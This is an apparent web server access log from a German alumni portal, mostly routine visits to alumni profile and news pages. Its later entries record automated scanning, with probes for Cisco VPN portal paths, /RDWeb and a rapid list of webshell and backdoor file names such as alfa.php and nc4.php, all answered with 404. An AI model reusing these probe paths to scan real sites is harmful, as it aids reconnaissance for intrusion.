user;timestamp;referer;target;method;status
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-03 16:15:27;/gruppen/hobby/astronomie;/personen/alumni/schule/4440012;GET;200
8b36fbbbab82c5abae6b93ecf77279a79d10872198237062c15b84f55b91e04d;2025-11-03 16:15:59;;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-03 16:16:33;/gruppen/hobby/astronomie;/personen/alumni/schule/0349;GET;200
16fbc99e5043e90f3c48b7d676c88f5351045fd9489745d555ee61250bc1d660;2025-11-03 16:20:35;;/personen/alumni/schule/04A06;GET;200
49d13cd6638ea2e062af9513f8078e6a97d8dbe5beb47bfe06996adad639d6a9;2025-11-03 16:26:08;;/personen/alumni/schule/0349;GET;200
db3593459fb96ba8f7d5d6abe976cb916bba799fcb25050f11b2aa265364877d;2025-11-03 16:31:35;;/personen/alumni/schule/0350;GET;200
949bc052c6a1ced7a7c7ae82184aa304f596b6f43a3da2ed57f4f995dbf950f9;2025-11-03 16:37:20;;/personen/alumni/schule/164094;GET;200
0b8efd8b63a0aa20ecf48eb2c4aba916e4a455116668cd02e865e423a591ba26;2025-11-03 16:38:41;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
c20bb8ba7a7910aa72e83471b0a4c794d3f937aa5de50f453acd0c8d898f6b09;2025-11-03 16:39:17;;/;GET;200
c20bb8ba7a7910aa72e83471b0a4c794d3f937aa5de50f453acd0c8d898f6b09;2025-11-03 16:39:17;/https:/ga.jspm.io/npm:es-module-shims@1.10.0/dist/es-module-shims.js;/https:/ga.jspm.io/npm:es-module-shims@1.10.0/dist/es-module-shims.js;GET;404
c39033a4db53cb73bc2a62f06d408a13f3f9ac6ddeea8ee5e12ce2aeae10cda2;2025-11-03 16:40:06;;/4358713577;GET;404
265a0eaf4ac0bbbbcf4bbe9e13cad7b4236f060a1d3d192d880dc147e0bc2d58;2025-11-03 16:43:34;;/personen/alumni/schule/188001;GET;200
9f62c62fa5bca4579c092419536b0451ff9f93c572df3f7334dc73976dead89f;2025-11-03 16:49:43;;/personen/alumni/schule/40745;GET;200
0bbfd6013794c68ba73c50ff2f88ac04bb8781a55784b4905caeec11298c4d41;2025-11-03 16:50:38;;/;GET;200
fa7bb1dbfd1ce1c065ab0574fa4594fad54000350d177bfb0c16472b791446d3;2025-11-03 16:56:06;;/personen/alumni/schule/5820;GET;200
5e728117ac2c594e376a18c1ceadb98e2f89b23edb4158ef964e02bdd22a5d9b;2025-11-03 17:01:47;;/personen/alumni/schule/9004;GET;200
6bd3c43a68e7f32af675066e0267da40843389e2b12f0c54e9157c0834b6d1d3;2025-11-03 17:05:06;;/personen/alumni/schule/03A04;GET;200
a94dd6a2c69ac92df91e8afbb25a6a1426c11316a30399593472c164be1ba1c5;2025-11-03 17:07:07;;/;GET;200
d73842affbdbe9d3c890fbf7458958937dfc4e7dcfb89357ee18766ea8f13ab7;2025-11-03 17:07:34;;/personen/alumni/schule/4440012;GET;200
68e73850d5dde68a5887e6593c8ba6bd2a7a6af7beecac081d0a649822eaf26f;2025-11-03 17:13:29;;/personen/alumni/schule/4540118;GET;200
b7023ccbc56ddc6c8f90deaee6840b267f42c1fd6359bbdbed75f4c4d4ede3ca;2025-11-03 17:15:55;;/RDWeb;GET;404
a7e19b38b86aafa080f2885e412ced6ef17481b650d2525b6b8c99fc62e1f26a;2025-11-03 17:18:40;/themen/details/der-start-ins-studium;/themen/details/der-start-ins-studium;GET;200
caf2db2165630ad0e1f21ef3a917f9805791f224131c185bd80f692bada19beb;2025-11-03 17:19:07;;/personen/alumni/schule/170574;GET;200
da85ba9df933a654e3c457b5d6e96fe54db412b40757dfc7cd3de8fac648fb3e;2025-11-03 17:20:22;;/;GET;200
5e728117ac2c594e376a18c1ceadb98e2f89b23edb4158ef964e02bdd22a5d9b;2025-11-03 17:24:49;;/personen/alumni/schule/09A05;GET;200
b8b371a672032d9dc93cea57e1d24867be43880e47610747e200141eb438f1d4;2025-11-03 17:25:40;;/;GET;200
052ae7f02868b0df2a87a55b830a09a6f034cb832b0fcfd390a928be6f649c88;2025-11-03 17:29:11;;/;GET;200
67600a20d0551053ac3f47760070178bfb53041d52bc13039e4b3afa6d5d0d66;2025-11-03 17:30:32;;/;GET;200
82780c43d6af32675587ea17cf4612351c171f64927228acc7c27694ec5e698c;2025-11-03 17:30:37;;/;GET;200
c20bb8ba7a7910aa72e83471b0a4c794d3f937aa5de50f453acd0c8d898f6b09;2025-11-03 17:31:33;;/;GET;200
c20bb8ba7a7910aa72e83471b0a4c794d3f937aa5de50f453acd0c8d898f6b09;2025-11-03 17:31:33;/https:/ga.jspm.io/npm:es-module-shims@1.10.0/dist/es-module-shims.js;/https:/ga.jspm.io/npm:es-module-shims@1.10.0/dist/es-module-shims.js;GET;404
c63583c84c1885c0626fc205f06c6c5acd0e3ac93c58e311d363a5a1cb4215ef;2025-11-03 17:33:48;;/;GET;200
a85d505b450dd9d8677d789c5e1c50d9553b7666ac2ae34b41049b05a2bc0470;2025-11-03 17:35:05;;/personen/alumni/schule/9001;GET;200
b64cb43c3973613907de0e3e69b90779235e3117691dbbdf5222297e411a6cb1;2025-11-03 17:36:06;;/+CSCOL+/Java.jar;GET;404
b64cb43c3973613907de0e3e69b90779235e3117691dbbdf5222297e411a6cb1;2025-11-03 17:36:07;;/+CSCOE+/logon_forms.js;GET;404
b64cb43c3973613907de0e3e69b90779235e3117691dbbdf5222297e411a6cb1;2025-11-03 17:36:08;;/+CSCOL+/a1.jar;GET;404
b64cb43c3973613907de0e3e69b90779235e3117691dbbdf5222297e411a6cb1;2025-11-03 17:36:09;;/+CSCOE+/transfer.js;GET;404
984f333dec00540bad34beceac101a6d30b257eeed5c328c1526841add6f5b47;2025-11-03 17:41:22;;/personen/alumni/schule/03A04;GET;200
d4903c41d93c8fb8ea3b71feb2858da18430b8137054541a5630568055fc3957;2025-11-03 17:42:45;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
d3c54e4be05518608c94162bb9e504e0c4362566d2cdef2fbb23ec4e4237e103;2025-11-03 17:45:25;;/personen/alumni/schule/MP004;GET;200
15cf39e65972c8d0f8ea602eb2d801594e05bfbf71359bbb08a6a0aa9ec82f06;2025-11-03 17:46:07;;/themen/details/abschied-aus-moabit;GET;200
8d008aea3416313437b39af86bf23612b6e18c33d0d675b3b79bf49be4f7d655;2025-11-03 17:46:48;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
58b24007c60dab5c5419e584adccdb7cd5356c203b6e22eb7bc41ee26a42b701;2025-11-03 17:50:12;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
431f4b9aff6218f814d04d9f6d620bc3819d8d483a2c13e3d3faa2f352927362;2025-11-03 17:51:02;;/personen/alumni/schule/0350;GET;200
fc5e92945923d33fd8d64822b265010e2e2acf08b358d3e09e2514d7947225da;2025-11-03 17:51:19;;/;GET;200
7255f857a3f68eb35224d0200799e110203d1988ce3ae811663a173cd8dfce00;2025-11-03 17:51:19;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
94225fdc0181ca82602919604d29b883b20ed88aee9e598188f22a1b490da17c;2025-11-03 17:52:36;;/personen/alumni/schule/9009;GET;200
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:01;;/.well-known/;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:02;;/chosen/function.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:02;;/a.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:02;;/aa.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:02;;/abcd.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:03;;/about.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:03;;/admin.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:03;;/alfa.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:03;;/atomlib.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:04;;/autoload_classmap.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:04;;/b.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:04;;/buy.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:04;;/chosen.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:04;;/classwithtostring.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:05;;/config.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:05;;/dropdown.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:05;;/edit.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:05;;/file.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:05;;/file2.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:05;;/files.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:05;;/flower.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:06;;/gecko-new.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:06;;/goods.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:06;;/info.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:06;;/info.php/aa.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:06;;/install.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:06;;/ioxi-o.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:06;;/k.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:06;;/makeasmtp.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:06;;/manager.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:06;;/moon.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:06;;/nc4.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:07;;/saxzgf5.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:07;;/test1.php/aa.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:07;;/theme.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:07;;/w.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:07;;/wp-2019.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:07;;/wp-admin.php;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:07;;/wp-admin/;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:07;;/wp-content;GET;404
1f116eb36d4d9b6ab6217cc9ab280c1a4cb50d41f6e8d3d71b002c2b86ab37b0;2025-11-03 17:54:07;;/wp-includes;GET;404
